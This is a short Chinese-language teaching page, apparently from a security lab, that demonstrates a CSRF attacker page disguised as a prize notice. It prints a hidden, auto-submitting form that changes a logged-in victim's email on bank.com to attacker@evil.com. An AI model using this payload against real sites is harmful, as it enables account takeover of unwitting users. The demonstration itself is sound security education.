🎁 「恭喜您中奖啦！」（其实是恶意页面）

⚠️ 仅供学习，勿用于攻击真实站点。本页演示 CSRF 攻击者页面的典型形态：一个用户看不见的自动提交表单。

页面看起来人畜无害，但背后藏着一个指向目标应用「修改邮箱」接口的隐藏表单，加载即自动提交。

真实攻击中，攻击者页面会这样写（跨站 POST，浏览器自动带上目标站 Cookie）：

<form action="https://bank.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

演示：请先在另一个标签打开 victim-app.html（模拟你已登录），本页会尝试把你的邮箱偷偷改成 attacker@evil.com。
